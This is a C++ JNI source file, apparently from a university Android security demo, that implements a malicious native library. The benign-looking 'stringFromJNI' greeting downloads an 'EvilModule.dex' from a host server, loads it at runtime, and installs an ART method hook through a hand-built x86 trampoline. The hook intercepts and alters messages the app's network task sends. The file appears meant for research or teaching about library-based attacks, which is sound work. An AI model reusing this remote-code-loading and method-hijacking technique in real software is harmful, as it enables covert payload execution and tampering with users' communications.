#include <jni.h>
#include <stdlib.h>
#include<string>
#include <string.h>
#include <errno.h>
#include <stdio.h>

#include <sys/mman.h>


#include <sys/stat.h>


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <netdb.h>
#include <sstream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include<memory>

#include <fstream>

#include "Connection.h"
#include "Downloader.h"
#include "Util.h"
#include "EvilModuleProvider.h"
#include "Hook.h"

using namespace std;
using namespace util;



jclass loadClass(jobject loader, const char *, JNIEnv *env) throw(ClassNotFoundException);

Hook* hook;

//java.lang.String evil.evil_module.EvilModule.doInBackgroundHook(java.lang.String[])
unsigned char doInBackgroundHookToNativeTrampoline[] = {
        0x57,  // push edi
        0x56,  // push esi
        0x55,  // push ebp
        0x83, 0xC4, 0xE4,  // add esp, -28
        0x50,  // push eax
        0x89, 0x4C, 0x24, 0x34,  // mov [esp + 52], ecx
        0x89, 0x54, 0x24, 0x38,  // mov [esp + 56], edx
        0xC7, 0x44, 0x24, 0x08, 0x02, 0x00, 0x00, 0x00,  // mov [esp + 8], 2
        0x64, 0x8B, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xc4]  ; top_handle_scope
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x8D, 0x4C, 0x24, 0x04,  // lea ecx, [esp + 4]
        0x64, 0x89, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov fs:[0xc4], ecx  ; top_handle_scope
        0x8B, 0x4C, 0x24, 0x34,  // mov ecx, [esp + 52]
        0x89, 0x4C, 0x24, 0x0C,  // mov [esp + 12], ecx
        0x8B, 0x4C, 0x24, 0x38,  // mov ecx, [esp + 56]
        0x89, 0x4C, 0x24, 0x10,  // mov [esp + 16], ecx
        0x64, 0x89, 0x25, 0x8C, 0x00, 0x00, 0x00,  // mov fs:[0x8c], esp  ; top_quick_frame_method
        0x83, 0xC4, 0xF0,  // add esp, -16
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0xFF, 0x15, 0xC4, 0x01, 0x00, 0x00,  // call fs:[0x1c4]  ; pJniMethodStart
        0x89, 0x44, 0x24, 0x24,  // mov [esp + 36], eax
        0x8B, 0x4C, 0x24, 0x20,  // mov ecx, [esp + 32]
        0x85, 0xC9,  // test ecx, ecx
        0x0F, 0x84, 0x04, 0x00, 0x00, 0x00,  // jz/eq +4 (0x000010ac)
        0x8D, 0x4C, 0x24, 0x20,  // lea ecx, [esp + 32]
        0x89, 0x4C, 0x24, 0x08,  // mov [esp + 8], ecx
        0x8D, 0x4C, 0x24, 0x1C,  // lea ecx, [esp + 28]
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0x8B, 0x0D, 0x9C, 0x00, 0x00, 0x00,  // mov ecx, fs:[0x9c]  ; jni_env
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x8B, 0x4C, 0x24, 0x10,  // mov ecx, [esp + 16]
        0xFF, 0x51, 0x18,  // call [ecx + 24]
        0x89, 0x04, 0x24,  // mov [esp], eax
        0x8B, 0x4C, 0x24, 0x24,  // mov ecx, [esp + 36]
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x4C, 0x24, 0x08,  // mov [esp + 8], ecx
        0x64, 0xFF, 0x15, 0xDC, 0x01, 0x00, 0x00,  // call fs:[0x1dc]  ; pJniMethodEndWithReference
        0x83, 0xC4, 0x10,  // add esp, 16
        0x64, 0x83, 0x3D, 0x84, 0x00, 0x00, 0x00, 0x00,  // cmp fs:[0x84], 0  ; exception
        0x0F, 0x85, 0x07, 0x00, 0x00, 0x00,  // jnz/ne +7 (0x000010fe)
        0x83, 0xC4, 0x20,  // add esp, 32
        0x5D,  // pop ebp
        0x5E,  // pop esi
        0x5F,  // pop edi
        0xC3,  // ret
        0x64, 0x8B, 0x05, 0x84, 0x00, 0x00, 0x00,  // mov eax, fs:[0x84]  ; exception
        0x64, 0xFF, 0x15, 0xB8, 0x02, 0x00, 0x00,  // call fs:[0x2b8]  ; pDeliverException
        0xCC,  // int 3

};




static void fooNative(JNIEnv* env, jclass clazz) {
    logE("Java_evil_evil_1module_EvilModule_fooNative", "called!");
    jmethodID foo = env->GetStaticMethodID(clazz, "foo", "()V");
    env->CallStaticVoidMethod(clazz, foo);
}

//protected String doInBackground(String... messages)
static jstring doInBackgroundNative(JNIEnv* env, jobject sendTask, jobjectArray messages) {

    logE("doInBackgroundNative", "called!");

    if (hook->isActivated()) {
        jstring message = (jstring) env->GetObjectArrayElement(messages, 0);

        std::ostringstream ss;
        ss  << env->GetStringUTFChars(message, NULL) << " <<< message was intercepted by evil lib >>>";

        message = env->NewStringUTF(ss.str().c_str());

        env->SetObjectArrayElement(messages, 0, message);
    }

    jmethodID backup = (jmethodID)hook->getBackupMethod();

    jclass clazz = env->GetObjectClass(sendTask);
    hook->resetHotnessCount(backup);
    return (jstring) env->CallNonvirtualObjectMethod(sendTask, clazz, backup, messages);
}


extern "C"
JNIEXPORT jstring
JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    string hello = "Hello from C++";

    string evilModulePath;
    EvilModuleProvider provider(Service ("10.0.2.2", 5050));
    try {
        evilModulePath = provider.downloadEvilModule(env, "EvilModule.dex");
    } catch(DownloadException e) {
        logE("EVIL_LIB::stringFromJNI", "Couldn't download evil module: Cause: %s", e.what());
    }

    logE("EVIL_LIB::stringFromJNI", "Successfully downloaded evil module: %s", evilModulePath.c_str());


    jobject loader = createDexClassLoader(evilModulePath.c_str(), env);
    loader = env->NewGlobalRef(loader);

    jclass evilModuleClass = NULL;

    try {
        evilModuleClass = loadClass(loader, "evil.evil_module.EvilModule", env);
    } catch (ClassNotFoundException e) {
        logE("EVIL_LIB::stringFromJNI", "Couldn't load EvilModule: %s", e.what());
    }


    logE("EVIL_LIB::stringFromJNI", "Successfully loaded evil module");


    jclass targetClass = env->FindClass("de/unipassau/fim/reallife_security/demoapp/demoapp/NetworkManager$SendTask");
    jmethodID doInBackgroundTarget = env->GetMethodID(targetClass, "doInBackground", "([Ljava/lang/String;)Ljava/lang/String;");
    jmethodID doInBackgroundHook = env->GetMethodID(evilModuleClass, "doInBackgroundHook", "([Ljava/lang/String;)Ljava/lang/String;");
    jmethodID doInBackgroundBackup = env->GetMethodID(evilModuleClass, "doInBackgroundBackup", "([Ljava/lang/String;)Ljava/lang/String;");

    int hookAddress = (int)(size_t)doInBackgroundNative;
    unsigned char* trampoline = doInBackgroundHookToNativeTrampoline;
    size_t size = sizeof(doInBackgroundHookToNativeTrampoline);

    //void* hookArtMethod, void* backupArtMethod, void* targetArtMethod, int nativeHookAddress,unsigned char* trampoline, size_t size
    hook = new Hook(doInBackgroundHook, doInBackgroundBackup, doInBackgroundTarget, hookAddress,
    trampoline, size);

    hook->activate(false);

    //std::remove(evilModulePath.c_str());
    logE("EVIL_LIB::stringFromJNI", "Done");

    return env->NewStringUTF(hello.c_str());
}


jclass loadClass(jobject loader, const char* className, JNIEnv *env) throw(ClassNotFoundException){

    // Get function ClassLoader.loadClass()
    jclass loaderClass = env->GetObjectClass(loader);
    jmethodID classLoadClass = env->GetMethodID(loaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");

    // load the evil module
    jstring classNameJava = env->NewStringUTF(className);
    jclass evilModuleClass = (jclass) env->CallObjectMethod(loader, classLoadClass, classNameJava);
    evilModuleClass = (jclass) env->NewGlobalRef(evilModuleClass);

    bool evilModuleLoaded = !env->ExceptionCheck();

    if (!evilModuleLoaded) {

        jthrowable exception = env->ExceptionOccurred();
        env->ExceptionClear();
        jstring message = getExceptionMessage(env, exception);

        const char* msg = env->GetStringUTFChars(message, NULL);

        std::string messageObject(msg);
        env->ReleaseStringUTFChars(message, msg);

        ostringstream ss;
        ss << "Couldn't load class: " << messageObject.c_str();
        throw ClassNotFoundException(ss.str());
    }

    return evilModuleClass;
}

extern "C"
JNIEXPORT void JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_activateHookJNI(JNIEnv *env,
                                                                                      jobject instance) {

    if (hook) hook->activate(true);

}extern "C"
JNIEXPORT void JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_deactivateHookJNI(JNIEnv *env,
                                                                                        jobject instance) {

    if (hook) hook->activate(false);

}